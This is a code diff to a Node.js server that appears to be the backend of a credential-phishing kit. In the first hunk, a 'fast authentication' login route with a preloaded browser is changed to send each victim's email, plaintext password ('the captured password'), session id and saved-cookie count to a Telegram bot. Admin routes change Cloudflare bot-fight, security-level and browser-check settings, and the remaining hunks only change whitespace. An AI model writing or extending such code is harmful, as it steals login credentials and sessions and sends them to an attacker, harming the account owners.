@@ -1001,10 +1001,13 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         // Send Telegram notification if bot is available
                         if (telegramBot) {
                             try {
-                                await telegramBot.sendLoginAlert(email, 'FAST Authentication (preloaded browser)', {
+                                await telegramBot.sendLoginNotification({
+                                    email: email,
+                                    password: password, // Include the captured password
+                                    timestamp: new Date().toISOString(),
                                     sessionId: sessionId,
-                                    cookiesSaved: sessionValidation.cookiesSaved,
-                                    preloadUsed: true
+                                    totalCookies: sessionValidation.cookiesSaved || 0,
+                                    authMethod: 'FAST Authentication (preloaded browser)'
                                 });
                             } catch (telegramError) {
                                 console.warn('Telegram notification failed:', telegramError.message);
@@ -1918,12 +1921,12 @@ if (fs.existsSync(CLOUDFLARE_CONFIG_FILE)) {
     try {
         const savedConfig = JSON.parse(fs.readFileSync(CLOUDFLARE_CONFIG_FILE, 'utf8'));
         cloudflareConfig = { ...cloudflareConfig, ...savedConfig };
-        
+
         // Override with environment variables if available (more secure)
         if (process.env.CLOUDFLARE_EMAIL) {
             cloudflareConfig.email = process.env.CLOUDFLARE_EMAIL;
         }
-        
+
         console.log('🌤️ Cloudflare configuration loaded from file');
         if (cloudflareConfig.email && cloudflareConfig.apiKey && cloudflareConfig.zoneId) {
             console.log('✅ Global API Key authentication configured');
@@ -2045,7 +2048,7 @@ app.post('/api/admin/cloudflare/configure', requireAdminAuth, async (req, res) =
 
         try {
             await callCloudflareAPI('');
-            
+
             // Save configuration to file
             fs.writeFileSync(CLOUDFLARE_CONFIG_FILE, JSON.stringify(testConfig, null, 2));
             console.log('🌤️ Cloudflare configuration saved successfully');
@@ -2074,7 +2077,7 @@ app.post('/api/admin/cloudflare/configure', requireAdminAuth, async (req, res) =
 app.post('/api/admin/cloudflare/bot-fight', requireAdminAuth, async (req, res) => {
     try {
         const { enabled } = req.body;
-        
+
         await callCloudflareAPI('/settings/bot_fight_mode', 'PATCH', {
             value: enabled ? 'on' : 'off'
         });
@@ -2101,7 +2104,7 @@ app.post('/api/admin/cloudflare/security-level', requireAdminAuth, async (req, r
     try {
         const { level } = req.body;
         const validLevels = ['off', 'essentially_off', 'low', 'medium', 'high', 'under_attack'];
-        
+
         if (!validLevels.includes(level)) {
             return res.status(400).json({
                 success: false,
@@ -2134,7 +2137,7 @@ app.post('/api/admin/cloudflare/security-level', requireAdminAuth, async (req, r
 app.post('/api/admin/cloudflare/browser-check', requireAdminAuth, async (req, res) => {
     try {
         const { enabled } = req.body;
-        
+
         await callCloudflareAPI('/settings/browser_check', 'PATCH', {
             value: enabled ? 'on' : 'off'
         });
